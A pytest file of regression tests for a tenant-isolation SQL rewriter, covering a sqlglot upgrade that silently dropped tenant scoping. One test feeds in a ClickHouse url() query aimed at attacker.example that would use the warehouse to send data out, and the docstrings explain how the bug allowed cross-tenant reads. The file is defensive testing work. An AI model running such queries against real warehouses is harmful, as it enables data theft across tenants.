"""The lake rewriter must refuse, not shrug, when it cannot scope a query.

`test_lake_sql.py` is the spec for what the rewriter *does*. This file is the
spec for what happens when the rewriter stops working — which it did, in
production-shaped conditions, without anybody noticing.

sqlglot 27 renamed the SELECT's FROM clause from `args["from"]` to
`args["from_"]`. The table walk read one key, got `None`, and took the branch
written for `SELECT 1` — "no FROM, so no tenant data, nothing to do". Every
single-table query then skipped the allowlist, skipped the ban on ClickHouse
table functions, and skipped the tenant predicate, and `rewrite_for_tenant`
returned it as a successful rewrite. `services/api/pyproject.toml` permitted
`sqlglot <31.0.0`, so this was reachable by installing the service as
declared.

The tests below therefore come in two kinds.

*Version-specific*: assert the current parser produces a scoped statement.
Useful, but it is the kind of test that was already present and still let the
bug ship, because CI only ever installed a version where it passed.

*Version-independent*: blind the table walk on purpose and assert the
rewriter raises. These hold on every sqlglot release, because they do not
depend on which key the parser is using this month — they encode the rule
that an unprovable scope is a refusal. They fail against the pre-fix
rewriter on any version.
"""

from __future__ import annotations

import uuid

import pytest
import sqlglot
from app.services import lake_sql
from app.services.lake_sql import (
    LakeSqlForbiddenError,
    LakeSqlIsolationError,
    rewrite_for_tenant,
)

TENANT_ID = uuid.UUID("3f2504e0-4f89-11d3-9a0c-0305e82c3301")
OTHER_TENANT = uuid.UUID("7b16a7e0-1111-4b2c-9f3d-000000000002")


def _blind_the_table_walk(monkeypatch: pytest.MonkeyPatch) -> None:
    """Reproduce the sqlglot-27 breakage on whatever sqlglot is installed.

    The real failure was `select.args.get("from")` returning `None` because
    the key had been renamed. Forcing `_from_clause` to `None` reproduces
    that state exactly, without needing the specific release that caused it.
    """
    monkeypatch.setattr(lake_sql, "_from_clause", lambda _select: None)


# ---------------------------------------------------------------------------
# Version-independent: a rewrite that cannot be proven scoped must raise
# ---------------------------------------------------------------------------


def test_blinded_table_walk_refuses_instead_of_returning_unscoped_sql(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The exact production failure: no predicate, reported as success.

    Against the pre-fix rewriter this returns
    `SELECT user_name FROM aisoc.raw_events LIMIT 10000` — every tenant's
    rows — with `referenced_tables` empty and no error.
    """
    _blind_the_table_walk(monkeypatch)

    with pytest.raises(LakeSqlIsolationError) as excinfo:
        rewrite_for_tenant("SELECT user_name FROM aisoc.raw_events", TENANT_ID)

    assert "aisoc.raw_events" in str(excinfo.value)


def test_blinded_table_walk_still_refuses_non_allowlisted_tables(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The allowlist went off with the predicate. `system.tables` is not lake data."""
    _blind_the_table_walk(monkeypatch)

    with pytest.raises((LakeSqlForbiddenError, LakeSqlIsolationError)):
        rewrite_for_tenant("SELECT * FROM system.tables", TENANT_ID)


def test_blinded_table_walk_still_refuses_table_functions(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`url()` is an outbound HTTP request made by the warehouse.

    With the walk blinded the pre-fix rewriter forwarded this to ClickHouse,
    which turns the lake into an egress channel: the statement is executed
    with the warehouse's network identity, so it reaches anything the
    warehouse can reach and can post rows to it.
    """
    _blind_the_table_walk(monkeypatch)

    with pytest.raises((LakeSqlForbiddenError, LakeSqlIsolationError)):
        rewrite_for_tenant(
            "SELECT * FROM url('https://attacker.example/x', JSONEachRow, 'tenant_id String')",
            TENANT_ID,
        )


def test_blinded_walk_leaves_constant_projections_alone(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A statement that genuinely has no FROM must still be allowed.

    Otherwise the fix would be "refuse everything", which passes an
    isolation test and breaks the product.
    """
    _blind_the_table_walk(monkeypatch)

    result = rewrite_for_tenant("SELECT 1 AS hello", TENANT_ID)
    assert result.referenced_tables == frozenset()


def test_predicate_stripped_after_injection_is_caught(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A `where()` that silently stops mutating the tree must not pass.

    Injection succeeding in the AST and not surviving into the rendered
    string is a different failure from the one above, and the audit has to
    catch it independently — otherwise we are only testing the bug we
    already know about.
    """
    original = lake_sql._validate_and_rewrite_select

    def _inject_then_discard(select, tenant_id, cte_aliases, referenced):  # noqa: ANN001, ANN202
        original(select, tenant_id, cte_aliases, referenced)
        select.set("where", None)

    monkeypatch.setattr(lake_sql, "_validate_and_rewrite_select", _inject_then_discard)

    with pytest.raises(LakeSqlIsolationError):
        rewrite_for_tenant("SELECT user_name FROM aisoc.raw_events", TENANT_ID)


def test_partially_scoped_union_is_caught(monkeypatch: pytest.MonkeyPatch) -> None:
    """One scoped branch and one unscoped branch is still a cross-tenant read.

    A whole-statement "does the tenant id appear anywhere" check would pass
    this, which is why the audit walks each rendered SELECT.
    """
    calls = {"n": 0}
    original = lake_sql._validate_and_rewrite_select

    def _skip_the_second_branch(select, tenant_id, cte_aliases, referenced):  # noqa: ANN001, ANN202
        calls["n"] += 1
        original(select, tenant_id, cte_aliases, referenced)
        if calls["n"] == 2:
            select.set("where", None)

    monkeypatch.setattr(lake_sql, "_validate_and_rewrite_select", _skip_the_second_branch)

    with pytest.raises(LakeSqlIsolationError):
        rewrite_for_tenant(
            "SELECT id FROM aisoc.raw_events UNION ALL SELECT id FROM aisoc.alert_metrics",
            TENANT_ID,
        )


# ---------------------------------------------------------------------------
# The FROM-clause lookup itself
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT user_name FROM aisoc.raw_events",
        "SELECT * FROM raw_events",
        "SELECT id FROM aisoc.raw_events WHERE severity = 'high'",
        "WITH h AS (SELECT id FROM aisoc.raw_events) SELECT * FROM h",
        "SELECT id FROM aisoc.raw_events UNION ALL SELECT id FROM aisoc.alert_metrics",
        "SELECT id FROM aisoc.alert_metrics WHERE event_id IN (SELECT id FROM aisoc.raw_events)",
        "SELECT r.id FROM aisoc.raw_events r JOIN aisoc.alert_metrics a ON a.event_id = r.id",
    ],
)
def test_every_shape_carries_the_tenant_on_this_sqlglot(sql: str) -> None:
    """Whatever sqlglot is installed, these shapes come back scoped.

    The single-table cases are the ones that silently lost their predicate
    on sqlglot >= 27. Run this file on both sides of that boundary (the
    `lake-isolation.yml` matrix does) and the regression cannot return.
    """
    result = rewrite_for_tenant(sql, TENANT_ID)

    assert str(TENANT_ID) in result.sql, f"no tenant predicate on sqlglot {sqlglot.__version__}: {result.sql}"
    assert result.referenced_tables, "a query over lake tables reported touching none"
    assert str(OTHER_TENANT) not in result.sql


def test_from_clause_is_found_by_node_type_not_by_key_name() -> None:
    """The lookup must not depend on the arg key, which is not a contract.

    `args["from"]` became `args["from_"]`; assume a third rename and the
    resolver still has to find the clause.
    """
    select = sqlglot.parse_one("SELECT a FROM aisoc.raw_events", read="clickhouse")
    clause = lake_sql._from_clause(select)

    assert clause is not None
    assert isinstance(clause, sqlglot.exp.From)

    renamed = sqlglot.parse_one("SELECT a FROM aisoc.raw_events", read="clickhouse")
    for key in ("from", "from_"):
        if key in renamed.args:
            renamed.args["a_future_rename"] = renamed.args.pop(key)
    assert isinstance(lake_sql._from_clause(renamed), sqlglot.exp.From)
